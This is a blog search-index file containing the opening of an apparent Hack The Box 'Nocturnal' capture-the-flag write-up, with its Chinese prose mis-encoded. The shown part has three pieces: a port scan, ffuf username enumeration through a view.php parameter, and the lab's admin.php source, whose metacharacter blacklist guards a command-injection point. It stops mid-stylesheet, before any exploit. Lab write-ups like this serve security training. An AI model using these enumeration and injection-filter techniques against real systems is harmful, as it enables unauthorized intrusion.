<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB-Nocturnal</title>
    <link href="/2025/04/17/HTB-Nocturnal/"/>
    <url>/2025/04/17/HTB-Nocturnal/</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-Nocturnal"><a href="#HTB-Nocturnal" class="headerlink" title="HTB-Nocturnal"></a>HTB-Nocturnal</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs apache"> <span class="hljs-attribute">rustscan</span> -a <span class="hljs-number">10.10.11.64</span> --range <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -- -sV<span class="hljs-meta"></span><br><span class="hljs-meta">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span><br><span class="hljs-meta">[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. </span><br><span class="hljs-meta">Open 10.10.11.64:22</span><br><span class="hljs-meta">Open 10.10.11.64:80</span><br><span class="hljs-meta">[~] Starting Nmap</span><br><span class="hljs-meta">[&gt;] The Nmap command to be run is nmap -sV -vvv -p 22,80 10.10.11.64</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-17 20:30 -06</span><br><span class="hljs-meta">NSE: Loaded 46 scripts for scanning.</span><br><span class="hljs-meta">Initiating Ping Scan at 20:30</span><br><span class="hljs-meta">Scanning 10.10.11.64 [4 ports]</span><br><span class="hljs-attribute">Completed</span> Ping Scan at <span class="hljs-number">20</span>:<span class="hljs-number">30</span>, <span class="hljs-number">0</span>.<span class="hljs-number">27</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br><span class="hljs-attribute">Initiating</span> Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">20</span>:<span class="hljs-number">30</span><br><span class="hljs-attribute">Completed</span> Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">20</span>:<span class="hljs-number">31</span>, <span class="hljs-number">13</span>.<span class="hljs-number">00</span>s elapsed<br><span class="hljs-attribute">DNS</span> resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">13</span>.<span class="hljs-number">01</span>s. Mode: Async<span class="hljs-meta"> [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]</span><br><span class="hljs-attribute">Initiating</span> SYN Stealth Scan at <span class="hljs-number">20</span>:<span class="hljs-number">31</span><br><span class="hljs-attribute">Scanning</span> <span class="hljs-number">10.10.11.64</span><span class="hljs-meta"> [2 ports]</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">80</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.64</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">22</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.64</span><br><span class="hljs-attribute">Completed</span> SYN Stealth Scan at <span class="hljs-number">20</span>:<span class="hljs-number">31</span>, <span class="hljs-number">0</span>.<span class="hljs-number">25</span>s elapsed (<span class="hljs-number">2</span> total ports)<br><span class="hljs-attribute">Initiating</span> Service scan at <span class="hljs-number">20</span>:<span class="hljs-number">31</span><br><span class="hljs-attribute">Scanning</span> <span class="hljs-number">2</span> services <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.64</span><br><span class="hljs-attribute">Completed</span> Service scan at <span class="hljs-number">20</span>:<span class="hljs-number">31</span>, <span class="hljs-number">6</span>.<span class="hljs-number">56</span>s elapsed (<span class="hljs-number">2</span> services <span class="hljs-literal">on</span> <span class="hljs-number">1</span> host)<br><span class="hljs-attribute">NSE</span>: Script scanning <span class="hljs-number">10.10.11.64</span>.<br><span class="hljs-attribute">NSE</span>: Starting runlevel <span class="hljs-number">1</span> (of <span class="hljs-number">2</span>) scan.<br><span class="hljs-attribute">Initiating</span> NSE at <span class="hljs-number">20</span>:<span class="hljs-number">31</span><br><span class="hljs-attribute">Completed</span> NSE at <span class="hljs-number">20</span>:<span class="hljs-number">31</span>, <span class="hljs-number">1</span>.<span class="hljs-number">16</span>s elapsed<br><span class="hljs-attribute">NSE</span>: Starting runlevel <span class="hljs-number">2</span> (of <span class="hljs-number">2</span>) scan.<br><span class="hljs-attribute">Initiating</span> NSE at <span class="hljs-number">20</span>:<span class="hljs-number">31</span><br><span class="hljs-attribute">Completed</span> NSE at <span class="hljs-number">20</span>:<span class="hljs-number">31</span>, <span class="hljs-number">1</span>.<span class="hljs-number">32</span>s elapsed<br><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">10.10.11.64</span><br><span class="hljs-attribute">Host</span> is up, received echo-reply ttl <span class="hljs-number">63</span> (<span class="hljs-number">0</span>.<span class="hljs-number">25</span>s latency).<br><span class="hljs-attribute">Scanned</span> at <span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">17</span> <span class="hljs-number">20</span>:<span class="hljs-number">31</span>:<span class="hljs-number">01</span> -<span class="hljs-number">06</span> for <span class="hljs-number">9</span>s<br><br><span class="hljs-attribute">PORT</span>   STATE SERVICE REASON         VERSION<br><span class="hljs-attribute">22</span>/tcp open  ssh     syn-ack ttl <span class="hljs-number">63</span> OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">12</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp open  http    syn-ack ttl <span class="hljs-number">63</span> nginx <span class="hljs-number">1</span>.<span class="hljs-number">18</span>.<span class="hljs-number">0</span> (Ubuntu)<br><span class="hljs-attribute">Service</span> Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br><span class="hljs-attribute">Read</span> data files from: /usr/bin/../share/nmap<br><span class="hljs-attribute">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-attribute">Nmap</span> done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">23</span>.<span class="hljs-number">98</span> seconds<br>           <span class="hljs-attribute">Raw</span> packets sent: <span class="hljs-number">6</span> (<span class="hljs-number">240</span>B) | Rcvd: <span class="hljs-number">3</span> (<span class="hljs-number">116</span>B)<br></code></pre></td></tr></table></figure><p>22å’Œ80ç«¯å£å¼€æ”¾ï¼Œå°†ipå’ŒåŸŸåæ·»åŠ åˆ°/etc/hostsä¸­ è¿›è¡Œä¸€ä¸ªæ˜ å°„ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181141856.png" alt="image-20250418114113726"></p><p>åªæœ‰ä¸€ä¸ªç™»å½•æ¡†å’Œæ³¨å†Œæ¡†ï¼Œè¿™é‡Œæ³¨å†Œå­˜åœ¨çš„ç”¨æˆ·çš„è¯æ˜¯å¤±è´¥çš„ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181144808.png" alt="image-20250418114442551"></p><p>è¿™é‡Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œåé¢æ˜¯ä¸€ä¸ªç™½åå•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œæ‰¾ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„ä¸Šä¼ ä¸Šå»çœ‹çœ‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181151511.png" alt="image-20250418115151247"></p><h2 id="fuzzç”¨æˆ·å"><a href="#fuzzç”¨æˆ·å" class="headerlink" title="fuzzç”¨æˆ·å"></a>fuzzç”¨æˆ·å</h2><p>çœ‹ä¸‹é¢çš„è¿™ä¸ªï¼Œçœ‹ä¸€ä¸‹åœ°å€ä¿¡æ¯ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>nocturnal.htb/view.php?username=admin1&amp;file=<span class="hljs-number">1</span>.pdf<br></code></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯è¿™ä¸ªusernameå’Œfileå‚æ•°ï¼Œfileå‚æ•°å°è¯•ä»»æ„æ–‡ä»¶ä¸‹è½½æ²¡æœ‰ï¼Œè¿™ä¸ªusernameå¯ä»¥ç”¨æ¥fuzzéå†ç”¨æˆ·åã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181154255.png" alt="image-20250418115407093"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181154424.png" alt="image-20250418115446283"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u <span class="hljs-string">&#x27;http://nocturnal.htb/view.php?username=FUZZ&amp;file=1.pdf&#x27;</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>fuzzDicts<span class="hljs-regexp">/userNameDict/u</span>ser.txt -H <span class="hljs-string">&#x27;Cookie: PHPSESSID=28v1paku69psnjsabl7a6n4vpd&#x27;</span> -mc <span class="hljs-number">200</span> -fs <span class="hljs-number">2985</span><br><span class="hljs-regexp">//</span>-fs æ˜¯è¿‡æ»¤å“åº”åŒ…å¤§å°ä¸º<span class="hljs-number">2985</span>çš„<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181634728.png" alt="image-20250418163430540"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181659377.png" alt="image-20250418165941273"></p><p>æ¢æµ‹åˆ°å››ä¸ªç”¨æˆ·ã€‚</p><p>å½“è®¿é—® amanda è¿™ä¸ªç”¨æˆ·çš„æ—¶å€™ï¼Œä¸‹é¢æœ‰ä¸€ä¸ªæ–‡ä»¶ã€‚</p><h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181701684.png" alt="image-20250418170153485"></p><p>ä¸‹è½½ä¸‹æ¥çœ‹çœ‹ã€‚</p><p>é‡Œé¢æœ‰ä¸ªå¯†ç ï¼Œsshç™»å½•å¤±è´¥ï¼Œé‚£å°±å°è¯•ç™»å½•åå°ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181714752.png" alt="image-20250418171437561"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181725792.png" alt="image-20250418172544578"></p><p>ç‚¹å‡»ä¸Šé¢æ¡†èµ·æ¥çš„ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181730761.png" alt="image-20250418173043520"></p><p>å†admin.phpä¸­æœ‰ä¸€ä¸ªèƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504181736737.png" alt="image-20250418173651587"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) || (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] !== <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] !== <span class="hljs-string">&#x27;amanda&#x27;</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: login.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitizeFilePath</span>(<span class="hljs-params"><span class="hljs-variable">$filePath</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filePath</span>); <span class="hljs-comment">// Only gets the base name of the file</span><br>&#125;<br><br><span class="hljs-comment">// List only PHP files in a directory</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listPhpFiles</span>(<span class="hljs-params"><span class="hljs-variable">$dir</span></span>) </span>&#123;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">array_diff</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$dir</span>), [<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;..&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;ul class=&#x27;file-list&#x27;&gt;&quot;</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-variable">$sanitizedFile</span> = <span class="hljs-title function_ invoke__">sanitizeFilePath</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$sanitizedFile</span>)) &#123;<br>            <span class="hljs-comment">// Recursively call to list files inside directories</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;li class=&#x27;folder&#x27;&gt;ğŸ“ &lt;strong&gt;&quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$sanitizedFile</span>) . <span class="hljs-string">&quot;&lt;/strong&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;ul&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">listPhpFiles</span>(<span class="hljs-variable">$dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$sanitizedFile</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/ul&gt;&lt;/li&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$sanitizedFile</span>, PATHINFO_EXTENSION) === <span class="hljs-string">&#x27;php&#x27;</span>) &#123;<br>            <span class="hljs-comment">// Show only PHP files</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;li class=&#x27;file&#x27;&gt;ğŸ“„ &lt;a href=&#x27;admin.php?view=&quot;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$sanitizedFile</span>) . <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$sanitizedFile</span>) . <span class="hljs-string">&quot;&lt;/a&gt;&lt;/li&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/ul&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// View the content of the PHP file if the &#x27;view&#x27; option is passed</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;view&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">sanitizeFilePath</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;view&#x27;</span>]);<br>    <span class="hljs-variable">$filePath</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filePath</span>) &amp;&amp; <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filePath</span>, PATHINFO_EXTENSION) === <span class="hljs-string">&#x27;php&#x27;</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filePath</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;File not found or invalid path.&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanEntry</span>(<span class="hljs-params"><span class="hljs-variable">$entry</span></span>) </span>&#123;<br>    <span class="hljs-variable">$blacklist_chars</span> = [<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>];<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist_chars</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$entry</span>, <span class="hljs-variable">$char</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// Malicious input detected</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$entry</span>, ENT_QUOTES, <span class="hljs-string">&#x27;UTF-8&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;Admin Panel&lt;/title&gt;<br>    &lt;link href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&amp;display=swap&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            font-family: <span class="hljs-string">&#x27;Poppins&#x27;</span>, sans-serif;<br>            background-color: <span class="hljs-comment">#1a1a1a;</span><br>            margin: <span class="hljs-number">0</span>;<br>            padding: <span class="hljs-number">0</span>;<br>            color: <span class="hljs-comment">#ff8c00;</span><br>            display: flex;<br>            justify-content: center;<br>            align-items: center;<br>            min-height: <span class="hljs-number">100</span>vh;<br>        &#125;<br><br>        .container &#123;<br>            background-color: <span class="hljs-comment">#2c2c2c;</span><br>            width: <span class="hljs-number">90</span>%;<br>            max-width: <span class="hljs-number">1000</span>px;<br>            padding: <span class="hljs-number">30</span>px;<br>            box-shadow: <span class="hljs-number">0</span> <span class="hljs-number">8</span>px <span class="hljs-number">20</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.5</span>);<br>            border-radius: <span class="hljs-number">12</span>px;<br>        &#125;<br><br>        h1, h2 &#123;<br>            color: <span class="hljs-comment">#ff8c00;</span><br>            font-weight: <span class="hljs-number">600</span>;<br>        &#125;<br><br>        form &#123;<br>            display: flex;<br>            flex-direction: column;<br>            gap: <span class="hljs-number">15</span>px;<br>            margin-bottom: <span class="hljs-number">30</span>px;<br>        &#125;<br><br>        input[type=<span class="hljs-string">&quot;password&quot;</span>] &#123;<br>            padding: <span class="hljs-number">12</span>px;<br>            font-size: <span class="hljs-number">16</span>px;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#555;</span><br>            border-radius: <span class="hljs-number">8</span>px;<br>            width: <span class="hljs-number">100</span>%;<br>            background-color: <span class="hljs-comment">#333;</span><br>            color: <span class="hljs-comment">#ff8c00;</span><br>        &#125;<br><br>        button &#123;<br>            padding: <span class="hljs-number">12</span>px;<br>            font-size: <span class="hljs-number">16</span>px;<br>            background-color: <span class="hljs-comment">#2d72bc;</span><br>            color: white;<br>            border: none;<br>            border-radius: <span class="hljs-number">8</span>px;<br>            cursor: pointer;<br>            transition: background-color <span class="hljs-number">0.3</span>s ease;<br>        &#125;<br><br>        button:hover &#123;<br>            background-color: <span class="hljs-comment">#245a9e;</span><br>        &#125;<br><br>        .file-<span class="hljs-keyword">list</span> &#123;<br>            <span class="hljs-keyword">list</span>-style: none;<br>            padding: <span class="hljs-number">0</span>;<br>        &#125;<br><br>        .file-<span class="hljs-keyword">list</span> li &#123;<br>            background-color: <span class="hljs-comment">#444;</span><br>            padding: <span class="hljs-number">15</span>px;<br>            margin-bottom: <span class="hljs-number">10</span>px;<br>            border-radius: <span class="hljs-number">8</span>px;<br>            display: flex;<br>            align-items: center;<br>        &#125;<br><br>        .file-<span class="hljs-keyword">list</span> li.folder &#123;<br>            background-color: <span class="hljs-comment">#3b3b3b;</span><br>        &#125;<br><br>        .file-<span class="hljs-keyword">list</span> li.file &#123;<br>            background-color: <span class="hljs-comment">#4d4d4d;</span><br>        &#125;<br><br>        .file-<span class="hljs-keyword">list</span> li a &#123;<br>            color: <span class="hljs-comment">#ff8c00;</span><br>            text-decoration: none;<br>            margin-left: <span class="hljs-number">10</span>px;<br>        &#125;<br><br>        .file-<span class="hljs-keyword">list</span> li a:hover &#123;<br>            text-decoration: underline;<br>        &#125;<br><br>        pre &#123;<br>            background-color: <span class="hljs-comment">#2d2d2d;</span><br>            color: <span class="hljs-comment">#eee;</span><br>            padding: <span class="hljs-number">20</span>px;<br>            border-radius: <span class="hljs-number">8</span>px;<br>            overflow-x: auto;<br>            font-family: <span class="hljs-string">&#x27;Courier New&#x27;</span>, Courier, monospace;<br>        &#125;<br><br>        .message &#123;<br>            padding: <span class="hljs-number">15</span>px;<br>            border-radius: <span class="hljs-number">8</span>px;<br>            margin-top: <span class="hljs-number">15</span>px;<br>            background-color: <span 